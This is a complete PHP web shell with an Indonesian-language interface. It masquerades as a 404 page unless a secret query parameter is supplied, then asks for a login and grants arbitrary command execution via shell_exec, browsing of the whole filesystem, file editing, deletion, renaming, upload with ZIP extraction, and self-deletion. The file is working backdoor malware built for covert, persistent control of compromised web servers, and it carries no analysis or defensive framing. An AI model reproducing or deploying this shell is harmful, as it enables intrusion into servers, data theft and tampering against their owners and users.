<?php
session_start();
ignore_user_abort(true);
set_time_limit(0);
ini_set('display_errors', 0);
error_reporting(0);

$trigger = 'eWVz';

$valid_user_hash = '$2a$12$bK5fJmlxn1Ldqnb8G4uyNeFl5scFzY7rHDmz0n/gXQdHhP.mGa7RG';
$valid_pass_hash = '$2a$12$Or6xUx6qiHaUnEDKTq8CFO8yhAsl3AwQ9/.MyuPKux.pxJ1TTeg2e';

if (!isset($_GET['access']) || $_GET['access'] !== $trigger) {
    http_response_code(404);
    echo "<h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>";
    exit;
}

if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $user_input = $_POST['user'] ?? '';
        $pass_input = $_POST['pass'] ?? '';

        if (password_verify($user_input, $valid_user_hash) && password_verify($pass_input, $valid_pass_hash)) {
            $_SESSION['login'] = true;
            header("Location: " . $_SERVER['PHP_SELF'] . "?access=$trigger");
            exit;
        } else {
            $error = "Username atau password salah!";
        }
    }

    
    echo "<style>
    body { background:#000; color:#0f0; font-family: monospace; text-align:center; padding-top:100px; }
    input { padding:8px; margin:5px 0; width:220px; background:#111; color:#0f0; border:1px solid #444; }
    button { padding:8px 15px; background:#222; color:#0f0; border:none; cursor:pointer; }
    .error { color:#f00; margin-bottom:10px; }
    </style>";
    echo "<h2>Login Shell</h2>";
    if (isset($error)) echo "<div class='error'>$error</div>";
    echo "<form method='post' action='?access=" . htmlspecialchars($trigger) . "'>
            <input type='text' name='user' placeholder='Username' required autofocus><br>
            <input type='password' name='pass' placeholder='Password' required><br>
            <button type='submit'>Masuk</button>
          </form>";
    exit;
}


if (ob_get_level()) {
    ob_end_flush();
}
ob_implicit_flush(true);

$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$dir || !is_dir($dir)) $dir = getcwd();

// Hapus shell
if (isset($_GET['delete'])) {
    unlink(__FILE__);
    exit("<b>Shell berhasil dihapus!</b>");
}

if (isset($_GET['deletefile'])) {
    $fileToDelete = realpath($_GET['deletefile']);
    if ($fileToDelete && strpos($fileToDelete, $dir) === 0 && is_file($fileToDelete)) {
        unlink($fileToDelete);
        echo "<p style='color:orange'>File berhasil dihapus: $fileToDelete</p>";
    } else {
        echo "<p style='color:red'>File tidak ditemukan atau tidak bisa dihapus.</p>";
    }
}

if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $oldPath = realpath($_GET['rename']);
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $_POST['newname'];
    if (rename($oldPath, $newPath)) {
        echo "<p style='color:lime'>Rename berhasil!</p>";
    } else {
        echo "<p style='color:red'>Rename gagal!</p>";
    }
}

if (isset($_FILES['files'])) {
    echo "<h3 style='color:yellow'>⏳ Upload sedang diproses, sabar ya gan...</h3>";
    flush(); ob_flush();

    $total = count($_FILES['files']['name']);
    $success = 0;

    for ($i = 0; $i < $total; $i++) {
        $tmp_name = $_FILES['files']['tmp_name'][$i];
        $name = basename($_FILES['files']['name'][$i]);
        $target = $dir . DIRECTORY_SEPARATOR . $name;

        if (move_uploaded_file($tmp_name, $target)) {
            echo "<p style='color:lime'>✔ Upload berhasil: " . htmlspecialchars($name) . "</p>";
            $success++;
        } else {
            echo "<p style='color:red'>✘ Upload gagal: " . htmlspecialchars($name) . "</p>";
        }
        flush(); ob_flush();
    }

    echo "<p style='color:cyan'><b>Upload selesai: $success / $total file berhasil.</b></p>";
    exit;
}

if (isset($_FILES['zipfile'])) {
    echo "<h3 style='color:yellow'>⏳ Upload ZIP sedang diproses, sabar ya gan...</h3>";
    flush(); ob_flush();

    $zipName = $_FILES['zipfile']['name'];
    $zipTmp = $_FILES['zipfile']['tmp_name'];
    $targetZip = $dir . DIRECTORY_SEPARATOR . basename($zipName);

    if (move_uploaded_file($zipTmp, $targetZip)) {
        $zip = new ZipArchive;
        if ($zip->open($targetZip) === TRUE) {
            if ($zip->extractTo($dir)) {
                echo "<p style='color:lime'>✔ ZIP berhasil diupload dan diekstrak.</p>";
            } else {
                echo "<p style='color:red'>✘ Gagal mengekstrak ZIP.</p>";
            }
            $zip->close();
            unlink($targetZip);
        } else {
            echo "<p style='color:red'>✘ Gagal membuka file ZIP.</p>";
        }
    } else {
        echo "<p style='color:red'>✘ Upload file ZIP gagal.</p>";
    }
    flush(); ob_flush();
    exit;
}

if (isset($_GET['edit'])) {
    $fileToEdit = realpath($_GET['edit']);
    if ($fileToEdit && strpos($fileToEdit, $dir) === 0 && is_file($fileToEdit)) {
        if (isset($_POST['save'])) {
            $newContent = $_POST['content'] ?? '';
            file_put_contents($fileToEdit, $newContent);
            echo "<p style='color:lime'>File berhasil disimpan: $fileToEdit</p>";
        }
        $content = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<h3>Edit File: " . htmlspecialchars(basename($fileToEdit)) . "</h3>";
        echo "<form method='post' action='?dir=".urlencode($dir)."&edit=".urlencode($fileToEdit)."&access=$trigger'>
                <textarea name='content' style='width:100%;height:300px;background:#222;color:#0f0;border:1px solid #555;font-family: monospace;'>".$content."</textarea><br>
                <button type='submit' name='save' style='color:white;'>Simpan</button>
                <a href='?dir=".urlencode($dir)."&access=$trigger' style='margin-left:10px;color:#ccc;'>Batal</a>
              </form>";
        exit;
    } else {
        echo "<p style='color:red'>File tidak ditemukan atau tidak bisa diedit.</p>";
    }
}

if (isset($_POST['newfile'])) {
    $path = $dir . DIRECTORY_SEPARATOR . $_POST['newfile'];
    file_put_contents($path, '');
}

if (isset($_POST['newdir'])) {
    $path = $dir . DIRECTORY_SEPARATOR . $_POST['newdir'];
    mkdir($path);
}

$cmdOutput = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $cmdOutput = shell_exec($cmd);
}

$parentDir = dirname($dir);
$scan = scandir($dir);

$dirs = [];
$files = [];
foreach ($scan as $item) {
    if ($item === '.') continue;
    $fullpath = $dir . DIRECTORY_SEPARATOR . $item;
    if (is_dir($fullpath)) $dirs[] = $item;
    else $files[] = $item;
}

echo "<style>
body{background:#111;color:#fff;font-family:monospace;}
a{color:lime;text-decoration:none;}
table{width:100%; border-collapse: collapse;}
th,td{padding:6px; border:1px solid #333; text-align:left;}
form{margin-top:10px;}
button.deletefile, button.renamefile {
  background: transparent;
  border: none;
  color: white;
  cursor: pointer;
  font-weight: bold;
}
</style>";

echo "<h3>Directory: $dir</h3>";
echo "<a href='?dir=".urlencode($parentDir)."&access=$trigger'>&larr; Kembali</a><br><br>";

echo "<table><tr><th>Nama</th><th>Ukuran</th><th>Modifikasi</th><th>Permission</th><th>Opsi</th></tr>";
foreach ($dirs as $item) {
    $fullpath = $dir . DIRECTORY_SEPARATOR . $item;
    $perm = substr(sprintf('%o', fileperms($fullpath)), -4);
    echo "<tr>
        <td><a href='?dir=".urlencode($fullpath)."&access=$trigger'>📁 $item</a></td>
        <td>-</td>
        <td>".date('Y-m-d H:i', filemtime($fullpath))."</td>
        <td>rwxr-xr-x ($perm)</td>
        <td>
            <form method='post' action='?dir=".urlencode($dir)."&rename=".urlencode($fullpath)."&access=$trigger' style='display:inline;'>
                <input name='newname' placeholder='Rename ke...' required>
                <button type='submit' class='renamefile'> Rename</button>
            </form>
        </td>
    </tr>";
}
foreach ($files as $item) {
    $fullpath = $dir . DIRECTORY_SEPARATOR . $item;
    $perm = substr(sprintf('%o', fileperms($fullpath)), -4);
    echo "<tr>
        <td>$item</td>
        <td>".filesize($fullpath)." B</td>
        <td>".date('Y-m-d H:i', filemtime($fullpath))."</td>
        <td>rw-r--r-- ($perm)</td>
        <td>
            <a href='?dir=".urlencode($dir)."&edit=".urlencode($fullpath)."&access=$trigger' style='color:white'> Edit</a> | 
            <a href='?dir=".urlencode($dir)."&deletefile=".urlencode($fullpath)."&access=$trigger' onclick=\"return confirm('Yakin mau hapus file ini?');\" style='color:red'>🗑 Hapus</a>
            <form method='post' action='?dir=".urlencode($dir)."&rename=".urlencode($fullpath)."&access=$trigger' style='display:inline;'>
                <input name='newname' placeholder='Rename ke...' required>
                <button type='submit' class='renamefile'> Rename</button>
            </form>
        </td>
    </tr>";
}
echo "</table>";

echo "<form method='post' action='?dir=".urlencode($dir)."&access=$trigger'>
    <input type='text' name='newfile' placeholder='Nama file baru'>
    <button type='submit'>+ Buat File</button>
</form>";
echo "<form method='post' action='?dir=".urlencode($dir)."&access=$trigger'>
    <input type='text' name='newdir' placeholder='Nama folder baru'>
    <button type='submit'>+ Buat Folder</button>
</form>";

echo "<form method='post' enctype='multipart/form-data' style='margin-top:10px;' action='?dir=".urlencode($dir)."&access=$trigger'>
<label style='color:lime;'>Upload file (banyak sekaligus):</label><br>
<input type='file' name='files[]' multiple required>
<button type='submit'>Upload</button>
</form>";

echo "<form method='post' enctype='multipart/form-data' style='margin-top:10px;' action='?dir=".urlencode($dir)."&access=$trigger'>
<label style='color:lime;'>Upload file ZIP (akan diekstrak otomatis):</label><br>
<input type='file' name='zipfile' accept='.zip' required>
<button type='submit'>Upload & Extract</button>
</form>";

echo "<hr><form method='post' action='?dir=".urlencode($dir)."&access=$trigger'>
    <label style='color:lime'>Execute Command:</label><br>
    <input type='text' name='cmd' style='width:80%; background:#222; color:#fff; border:1px solid #555;' placeholder='Masukkan perintah shell...' autocomplete='off' required>
    <button type='submit'>Run</button>
</form>";

if ($cmdOutput !== '') {
    echo "<pre style='background:#222; color:#0f0; padding:10px; margin-top:10px; white-space: pre-wrap;'>".htmlspecialchars($cmdOutput)."</pre>";
}

echo "<br><a href='?delete=true&access=$trigger' style='color:red'>🗑 Hapus Shell Ini</a>";
?>
